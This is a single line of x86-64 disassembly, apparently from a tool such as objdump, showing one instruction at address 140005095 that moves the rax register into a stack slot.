   140005095:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
